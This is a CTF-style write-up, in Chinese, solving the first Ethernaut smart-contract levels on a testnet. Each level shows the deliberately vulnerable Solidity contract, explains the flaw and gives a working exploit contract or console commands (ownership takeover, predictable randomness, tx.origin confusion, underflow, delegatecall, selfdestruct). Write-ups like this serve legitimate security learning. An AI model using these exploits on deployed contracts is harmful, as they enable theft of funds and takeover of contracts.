# Ethernaut Writeups

!!! abstract 
    https://ethernaut.openzeppelin.com/ 上的一系列以太坊智能合约类题目，入门 blockchain 的时候做的，这里记下做题记录

前置步骤：

- 安装 MetaMask 浏览器插件，并创建新账户
- 连接到 Rinkeby 测试网络
- 通过 https://faucet.rinkeby.io/ 或者 https://faucets.chain.link/rinkeby 搞点测试币（主要用来后续支付 gas）
- 在 ethernaut 上连接 MetaMask
- 每一道题目先生成新实例，在 console 中完成后提交实例

---

## Hello Ethernaut

按照题目提示一步一步调用函数即可

---

## Fallback

给了合约源码

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Fallback {

        using SafeMath for uint256;
        mapping(address => uint) public contributions;
        address payable public owner;

        constructor() public {
            owner = msg.sender;
            contributions[msg.sender] = 1000 * (1 ether);
        }

        modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }

        function contribute() public payable {
            require(msg.value < 0.001 ether);
            contributions[msg.sender] += msg.value;
            if(contributions[msg.sender] > contributions[owner]) {
                owner = msg.sender;
            }
        }

        function getContribution() public view returns (uint) {
            return contributions[msg.sender];
        }

        function withdraw() public onlyOwner {
            owner.transfer(address(this).balance);
        }

        receive() external payable {
            require(msg.value > 0 && contributions[msg.sender] > 0);
            owner = msg.sender;
        }
    }
    ```

目标是拿到这个合约的控制权，转出所有余额

主要逻辑是 contribute 函数会增加调用者的 contributions，当大于 1000 ether 的时候，会把所有权转给玩家。通过这个来获得控制权是不现实的

而另一个会发生所有权转换的函数是 receive 函数，这是一个 fallback 函数，会在合约账户接收以太币的时候触发，所以在这里只要向合约发出带有以太币的交易就可以触发这个函数转移所有权

而之前还需要先保证 contributions 大于 0，所以解法：
```js
> contract.contribute({value: 1})      // 使 contributions 大于 0 
> contract.sendTransaction({value: 1}) // 触发 fallback 转移所有权
> contract.withdraw()                  // 转出所有余额
```

---

## Fallout

要求得到合约的所有权

根据合约源码可以发现它的 constructor 的函数名为 Fal1out，并不是合约名 Fallout，有 l1 的差别

所以直接调用 contract.Fal1out() 就可以调用这个函数拿到合约所有权

---

## Coin Flip

??? question "题目合约"
    ```solidity
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract CoinFlip {

        using SafeMath for uint256;
        uint256 public consecutiveWins;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor() public {
            consecutiveWins = 0;
        }

        function flip(bool _guess) public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                consecutiveWins++;
                return true;
            } else {
                consecutiveWins = 0;
                return false;
            }
        }
    }
    ```

要求连续猜对十次，合约中给出了它取随机数的方式，即将 block.number 减一，取哈希值，然后再除以 FACTOR 判断是否为 1

所以写一个新合约来获取同样的 block.number 就可以计算出答案

因为判断了 lashHash == blockValue 的时候 revert，所以需要等一段时间，逐次猜测，连续猜 10 次 

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: GPL-3.0
    pragma solidity ^0.6.0;

    /* code of CoinFlip */

    contract Exploit {
        using SafeMath for uint256;
        CoinFlip p;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        constructor(address challenge) public {
            p = CoinFlip(challenge);
        }
        function exp() public {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            p.flip(side);
        }
    }
    ```

---

## Telephone

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Telephone {
        address public owner;
        constructor() public {
            owner = msg.sender;
        }

        function changeOwner(address _owner) public {
            if (tx.origin != msg.sender) {
                owner = _owner;
            }
        }
    }
    ```

也是需要拿到合约的所有权，而调用合约中的 changeOwner 函数来转移所有权的话，需要使 tx.origin 和 msg.sender 不同

它们的区别：

- tx.origin：交易发送方，是整个交易最开始的地址
- msg.sender：消息发送方，是当前调用的调用方地址

所以如果通过 账户 A -> 合约 A -> 合约 B 来调用的话，tx.origin 就是账户 A，而对于合约 B 来说，msg.sender 是合约 A

所以这题只需要编写一个新的合约来调用题目的 changeOwner 函数就好了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Telephone */

    contract Exploit {
        Telephone p = Telephone(<instance address>);
        function exp() public {
            p.changeOwner(msg.sender);
        }
    }
    ```

---

## Token

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Token {
        mapping(address => uint) balances;
        uint public totalSupply;

        constructor(uint _initialSupply) public {
            balances[msg.sender] = totalSupply = _initialSupply;
        }

        function transfer(address _to, uint _value) public returns (bool) {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        }

        function balanceOf(address _owner) public view returns (uint balance) {
            return balances[_owner];
        }
    }
    ```

开局自己的 balance 是 20，目的是增加自己的 balance

可以发现 transfer 中是直接将 sender 的 balance 减转账的 value，而如果 value 超过 balance 则会发生溢出，因为是 uint，则会变为很大的值

所以通过 `#!js await contract.transfer(<any address>, 21)` 即可使自己的 balance 溢出变大

---

## Delegation

??? question "题目合约"
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Delegate {
        address public owner;
        constructor(address _owner) public {
            owner = _owner;
        }
        function pwn() public {
            owner = msg.sender;
        }
    }

    contract Delegation {
        address public owner;
        Delegate delegate;
        constructor(address _delegateAddress) public {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }
        fallback() external {
            (bool result,) = address(delegate).delegatecall(msg.data);
            if (result) {
                this;
            }
        }
    }
    ```

目的还是拿到所有权，即执行 Delegate 中的 pwn 函数

可以通过触发 fallback 函数，然后调用 delegatecall 来通过 msg.data 调用 pwn 函数

data 中前四个字节是要调用的函数前面的 sha3 值的前四个字节，后面如果没有传入数据可以省略

所以计算出 pwn() 的 sha3 然后作为 data 传给 fallback 即可

```js 
> web3.utils.sha3("pwn()")
'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
> contract.sendTransaction({data: "0xdd365b8b"})
```

---

## Force

题目是一个空的合约，要求向其中转账

而一个合约在自毁的时候，可以将余额全部强制转到另一个地址上，所以新建一个合约然后自毁，把余额转到实例地址上就可以了

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    constructor() public payable {}  // 初始要接收 value 来创建合约
    function exp(address challenge) public {
        // 需要先强制转换为 payable
        address payable challenge = payable(address(challenge));
        selfdestruct(challenge);
    }
}
```